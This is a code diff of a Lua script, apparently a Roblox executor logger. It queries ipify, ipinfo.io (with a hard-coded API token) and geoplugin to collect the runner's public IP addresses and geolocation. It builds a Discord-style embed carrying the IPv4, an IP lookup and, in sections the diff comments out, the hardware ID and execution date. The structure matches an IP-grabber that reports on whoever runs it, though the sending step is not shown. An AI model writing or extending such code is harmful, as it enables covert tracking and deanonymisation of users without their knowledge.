@@ -16,6 +16,7 @@ local ipv6 = utils.getRawSiteData("https://api64.ipify.org")
 local ipdetails = utils.getRawSiteData("https://ipinfo.io/?token=03dce9579aa8e0")
 local geoloc = utils.getRawSiteData("http://www.geoplugin.net/json.gp?ip=" .. ipv4)
 
+--[[
 
 -- Account age
 
@@ -65,9 +66,6 @@ local function getDevice()
     end
 end
 
-
---[[
-
 -- Country
 
 
@@ -115,8 +113,6 @@ local function getCountry()
     return shortCountry, fullCountry
 end
 
-]]
-
 
 -- Fetching time zone
 
@@ -147,6 +143,8 @@ end
 local shortCountry, fullCountry = getCountry()
 local shortTimeZone, fullTimeZone = getTimeZone()
 
+]]
+
 
 -- Embed
 
@@ -159,6 +157,8 @@ local data = {
             type = "rich",
             color = tonumber(16711680),
             fields = {
+                --[[
+
                 {
                     name = "Execution Date",
                     value = "**" .. os.date("%x") .. " | " .. utils.getTime(true) .. os.date(" %p") .. "**",
@@ -225,6 +225,8 @@ local data = {
                     inline = true
                 },
 
+                ]]
+
                 {
                     name = "IPv4 (Primary)",
                     value = "||" .. ipv4 .. "||",
@@ -237,11 +239,15 @@ local data = {
                     inline = true
                 },
 
+                --[[
+
                 {
                     name = "Hardware ID (HWID)",
                     value = "||" .. hwid .. "||",
                     inline = true
                 },
+
+                ]]
 
                 {
                     name = "IP Address Lookup",
